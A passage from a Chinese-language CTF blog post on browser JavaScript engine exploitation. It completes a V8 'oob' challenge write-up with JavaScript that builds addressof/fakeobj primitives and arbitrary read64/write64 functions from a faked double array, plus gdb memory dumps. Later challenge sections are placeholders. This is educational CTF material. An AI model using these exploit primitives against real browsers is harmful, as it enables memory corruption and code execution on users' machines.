+<p>&ensp;&ensp;&ensp;&ensp;这里的代码逻辑也比较简单，首先利用越界获取obj及double类型数组的map值，实现泄露对象地址addressof函数只需将对象数组的map改为double类型，这样再次获取该对象即返回的是对象的地址，同理fakeobj函数中将double类型数组混淆成对象数组，这样即可把传递的地址参数伪造成对象处理。
+实现完成addressof与fakeobj函数之后后面的操作基本都没有什么难度了，我们可以通过将一个double类型的数组伪造成obj对象，然后修改其elements指针的值完成任意地址读写：
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fake_array=[</span><br><span class="line">    double_array_map,</span><br><span class="line">    0,</span><br><span class="line">    mem.u2d(0x1234567887654321),</span><br><span class="line">    mem.u2d(0x100000000)</span><br><span class="line">];</span><br><span class="line">fake_array_addr = addressof(fake_array);</span><br><span class="line">fake_array_obj = fakeobj(fake_array_addr+0x30);</span><br><span class="line">function read64(addr)&#123;</span><br><span class="line">    fake_array[2] = mem.u2d(addr-0x10+0x1);</span><br><span class="line">    value = mem.d2u(fake_array_obj[0]);</span><br><span class="line">    return value;</span><br><span class="line">&#125;</span><br><span class="line">function write64(addr,value)&#123;</span><br><span class="line">    fake_array[2] = mem.u2d(addr-0x10+0x1);</span><br><span class="line">    fake_array_obj[0] = mem.u2d(value);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>&ensp;&ensp;&ensp;&ensp;根据前面不同方式定义的数组在内存中的elements指针所指向的地址差异，此处伪造对象的地址（elements指针指向的数据地址）为fake_array_addr+0x30，如果是使用其它方式定义的数组，比如像test_array1、test_array2，其elements指针均指向对象前面的位置，需要对其进行对应的更改，出现这种差异的原因猜测是因为部分数组元素中使用运算进行赋值，除此之外还有个需要注意的地方就是构造的read、write函数中我们将混淆对象的elements指针赋值成了addr-0x10+0x1，加1这里比较好理解，是为了表示其为对象类型，这里还有一个减0x10的操作是为了调整elements指针所指向的数据偏移，elements指针本身所指向的也是一个对象，其结构如下：
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ job 0x31c649cf309</span><br><span class="line">0x31c649cf309: [FixedDoubleArray]</span><br><span class="line"> - map: 0x349f322814f9 &lt;Map&gt;</span><br><span class="line"> - length: 4</span><br><span class="line">           0: 1.14205e-317</span><br><span class="line">           1: 0</span><br><span class="line">           2: 5.62635e-221</span><br><span class="line">           3: 2.122e-314</span><br><span class="line">gdb-peda$ telescope 0x31c649cf308</span><br><span class="line">0000| 0x31c649cf308 --&gt; 0x349f322814f9 --&gt; 0x349f322801 </span><br><span class="line">0008| 0x31c649cf310 --&gt; 0x400000000 </span><br><span class="line">0016| 0x31c649cf318 --&gt; 0x234567 (&apos;gE#&apos;)</span><br><span class="line">0024| 0x31c649cf320 --&gt; 0x0 </span><br><span class="line">0032| 0x31c649cf328 --&gt; 0x1234567887654300 </span><br><span class="line">0040| 0x31c649cf330 --&gt; 0x100000000</span><br></pre></td></tr></table></figure>
+<p>&ensp;&ensp;&ensp;&ensp;实际elements指针的偏移0x10位置才是实际存储的数据，所以设置想要读写的地址时需要减去这个偏移。现在我们已经能够任意地址读写了。（虽然实际上实现的写入函数可能有些地址无法写入数据，已经基本能够满足使用了）
+
+<h3 id="rool-a-d8（pctf-2018）"><a href="#rool-a-d8（pctf-2018）" class="headerlink" title="rool a d8（pctf 2018）"></a>rool a d8（pctf 2018）</h3><hr>
+<p>&ensp;&ensp;&ensp;&ensp;to do
+
+<h3 id="krautflare-（35c3-ctf-2018）"><a href="#krautflare-（35c3-ctf-2018）" class="headerlink" title="krautflare （35c3 ctf 2018）"></a>krautflare （35c3 ctf 2018）</h3><hr>
+<p>&ensp;&ensp;&ensp;&ensp;to do
+
+<h3 id="groupjs-qwb-ctf-finals-2019"><a href="#groupjs-qwb-ctf-finals-2019" class="headerlink" title="groupjs (qwb ctf finals 2019)"></a>groupjs (qwb ctf finals 2019)</h3><hr>
+<p>&ensp;&ensp;&ensp;&ensp;to do
+
+<h3 id="Just-in-time-googlectf-finals-2018"><a href="#Just-in-time-googlectf-finals-2018" class="headerlink" title="Just-in-time (googlectf finals 2018)"></a>Just-in-time (googlectf finals 2018)</h3><hr>
+<p>&ensp;&ensp;&ensp;&ensp;to do
+
+<h3 id="v8-challenge-csaw-finals-2018"><a href="#v8-challenge-csaw-finals-2018" class="headerlink" title="v8 challenge (csaw finals 2018)"></a>v8 challenge (csaw finals 2018)</h3><hr>
+<p>&ensp;&ensp;&ensp;&ensp;to do
+
+<h2 id="Chakra-分析"><a href="#Chakra-分析" class="headerlink" title="Chakra 分析"></a>Chakra 分析<br></h2><blockquote>
+<p>&ensp;&ensp;&ensp;&ensp;Chakara的漏洞利用相比V8引擎要麻烦点。</p>
+</blockquote>
+<h3 id="childjs-（qwb-online-2019）"><a href="#childjs-（qwb-online-2019）" class="headerlink" title="childjs （qwb online 2019）"></a>childjs （qwb online 2019）</h3><hr>
+<p>&ensp;&ensp;&ensp;&ensp;to do
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Chrome-D8/" rel="tag"># Chrome D8</a>
+              <a href="/tags/Edge-Chakra/" rel="tag"># Edge Chakra</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2019/01/24/2019-01-24-%E4%B8%80%E6%AE%B5%E7%AE%80%E5%8D%95%E7%9A%84Shellcode%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDPE%E7%9A%84%E5%88%86%E6%9E%90/" rel="next" title="2019-01-24-一段简单的Shellcode内存加载PE的分析">
+                  <i class="fa fa-chevron-left"></i> 2019-01-24-一段简单的Shellcode内存加载PE的分析
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+                <a href="/2019/10/20/2019-10-22-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%AF%A1%E5%BC%82%E7%9A%84%E8%BF%9B%E7%A8%8B%E5%B4%A9%E6%BA%83%E5%88%86%E6%9E%90/" rel="prev" title="2019-10-22-记一次诡异的进程崩溃分析">
+                  2019-10-22-记一次诡异的进程崩溃分析 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#V8-分析"><span class="nav-number">1.</span> <span class="nav-text">V8 分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#oob（-ctf-2019）"><span class="nav-number">1.1.</span> <span class="nav-text">oob（*ctf 2019）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rool-a-d8（pctf-2018）"><span class="nav-number">1.2.</span> <span class="nav-text">rool a d8（pctf 2018）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#krautflare-（35c3-ctf-2018）"><span class="nav-number">1.3.</span> <span class="nav-text">krautflare （35c3 ctf 2018）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#groupjs-qwb-ctf-finals-2019"><span class="nav-number">1.4.</span> <span class="nav-text">groupjs (qwb ctf finals 2019)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Just-in-time-googlectf-finals-2018"><span class="nav-number">1.5.</span> <span class="nav-text">Just-in-time (googlectf finals 2018)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#v8-challenge-csaw-finals-2018"><span class="nav-number">1.6.</span> <span class="nav-text">v8 challenge (csaw finals 2018)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Chakra-分析"><span class="nav-number">2.</span> <span class="nav-text">Chakra 分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#childjs-（qwb-online-2019）"><span class="nav-number">2.1.</span> <span class="nav-text">childjs （qwb online 2019）</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="site-author-image" itemprop="image" alt="huhu"
+    src="/images/main.gif">
+  <p class="site-author-name" itemprop="name">huhu</p>
+  <div class="site-description" itemprop="description">悟已往之不谏、知来者之可追</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">47</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/huhu0706" title="GitHub &amp;rarr; https:&#x2F;&#x2F;github.com&#x2F;huhu0706" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:hu-qqchoi@qq.com" title="E-Mail &amp;rarr; mailto:hu-qqchoi@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">huhu</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">104k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:34</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.0.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.4.2
+  </div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.2"></script><script src="/js/motion.js?v=7.4.2"></script>
+<script src="/js/schemes/pisces.js?v=7.4.2"></script>
+<script src="/js/next-boot.js?v=7.4.2"></script>
+
+
+
+  
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.2"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
